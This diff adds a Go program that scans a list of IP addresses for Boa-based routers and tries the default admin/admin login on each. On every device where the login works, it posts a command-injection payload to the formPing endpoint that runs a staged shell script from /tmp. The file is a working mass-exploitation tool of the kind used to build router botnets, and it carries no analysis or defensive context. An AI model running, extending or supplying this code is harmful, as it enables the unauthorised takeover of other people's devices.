@@ -1,0 +1,134 @@
+package main
+
+import (
+	"bufio"
+	"bytes"
+	"fmt"
+	"net/http"
+	"os"
+	"strings"
+	"sync"
+	"time"
+)
+
+const (
+	batchSize     = 5
+	requestTimeout = 10 * time.Second
+)
+
+func main() {
+	inputFile, err := os.Open("ips.txt")
+	if err != nil {
+		fmt.Println("Error opening input file:", err)
+		return
+	}
+	defer inputFile.Close()
+
+	scanner := bufio.NewScanner(inputFile)
+	var wg sync.WaitGroup
+	ipBatch := make([]string, 0, batchSize)
+	for scanner.Scan() {
+		ip := scanner.Text()
+		ipBatch = append(ipBatch, ip)
+
+		if len(ipBatch) == batchSize {
+			wg.Add(1)
+			go processBatch(ipBatch, &wg)
+			ipBatch = make([]string, 0, batchSize)
+		}
+	}
+
+	// Process the remaining IPs in the last batch
+	if len(ipBatch) > 0 {
+		wg.Add(1)
+		go processBatch(ipBatch, &wg)
+	}
+
+	wg.Wait()
+
+	if err := scanner.Err(); err != nil {
+		fmt.Println("Error reading input file:", err)
+	}
+}
+
+func processBatch(ips []string, wg *sync.WaitGroup) {
+	defer wg.Done()
+
+	for _, ip := range ips {
+		url := fmt.Sprintf("http://%s/boaform/admin/formLogin", ip)
+		data := "username=admin&password=admin&save=Login&submit-url=%2Fadmin%2Flogin.asp&postSecurityFlag=36195"
+
+		req, err := http.NewRequest("POST", url, bytes.NewBufferString(data))
+		if err != nil {
+			fmt.Println("Error creating request for", ip, ":", err)
+			continue
+		}
+
+		req.Header.Set("Content-Length", fmt.Sprint(len(data)))
+		req.Header.Set("Cache-Control", "max-age=0")
+		req.Header.Set("Upgrade-Insecure-Requests", "1")
+		req.Header.Set("Origin", fmt.Sprintf("http://%s", ip))
+		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36")
+		req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
+		req.Header.Set("Referer", fmt.Sprintf("http://%s/admin/login.asp", ip))
+		req.Header.Set("Accept-Encoding", "gzip, deflate")
+		req.Header.Set("Accept-Language", "en-US,en;q=0.9")
+		req.Header.Set("Connection", "close")
+
+		client := &http.Client{
+			Timeout: requestTimeout,
+		}
+		resp, err := client.Do(req)
+		if err != nil {
+			if strings.Contains(err.Error(), "timeout") {
+				fmt.Println("[ERROR] request timed out for", ip)
+			} else {
+				fmt.Println("Error sending request for", ip, ":", err)
+			}
+			continue
+		}
+		defer resp.Body.Close()
+
+		// Check if the host redirects to "/" after login
+		if resp.StatusCode == http.StatusOK && strings.HasSuffix(resp.Request.URL.Path, "/") {
+			fmt.Println("[SUCCESS] Successful login for:", url)
+
+			// Send the additional POST request to /boaform/formPing
+			pingURL := fmt.Sprintf("http://%s/boaform/formPing", ip)
+			pingData := "pingAddr=%3Bcd+%2Ftmp%3Bsh+5.sh&wanif=65535&submit-url=%2Fping.asp&postSecurityFlag=6973"
+			pingReq, err := http.NewRequest("POST", pingURL, bytes.NewBufferString(pingData))
+			if err != nil {
+				fmt.Println("Error creating ping request for", ip, ":", err)
+				continue
+			}
+			pingReq.Header.Set("Content-Length", fmt.Sprint(len(pingData)))
+			pingReq.Header.Set("Cache-Control", "max-age=0")
+			pingReq.Header.Set("Upgrade-Insecure-Requests", "1")
+			pingReq.Header.Set("Origin", fmt.Sprintf("http://%s", ip))
+			pingReq.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+			pingReq.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36")
+			pingReq.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
+			pingReq.Header.Set("Referer", fmt.Sprintf("http://%s/ping.asp?v=1689105063000", ip))
+			pingReq.Header.Set("Accept-Encoding", "gzip, deflate")
+			pingReq.Header.Set("Accept-Language", "en-US,en;q=0.9")
+			pingReq.Header.Set("Connection", "close")
+
+			pingResp, err := client.Do(pingReq)
+			if err != nil {
+				fmt.Println("Error sending ping request for", ip, ":", err)
+				continue
+			}
+			defer pingResp.Body.Close()
+
+			// Check if the ping request was successful
+			if pingResp.StatusCode == http.StatusOK {
+				fmt.Println("[PING] Ping request sent successfully for:", url)
+			} else {
+				fmt.Println("[ERROR] Failed to send ping request for:", url)
+			}
+		} else {
+			fmt.Println("[ERROR] login failed for:", url)
+		}
+	}
+}
